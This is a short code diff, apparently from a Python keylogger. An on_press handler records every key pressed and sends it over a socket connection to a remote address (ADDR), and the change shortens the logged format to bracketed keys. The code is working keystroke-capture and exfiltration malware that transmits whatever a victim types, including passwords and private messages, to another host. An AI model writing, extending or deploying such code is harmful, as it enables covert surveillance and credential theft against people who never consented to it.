@@ -11,9 +11,9 @@ client.connect(ADDR)
 
 def on_press(key):
     try:
-        write('alphanumeric key {0} pressed'.format(key.char))
+        write('[{0}]'.format(key.char))
     except AttributeError:
-        write('special key {0} pressed'.format(key))
+        write('[{0}]'.format(key))
 
 def write(message):
     client.send(message.encode('utf-8'))
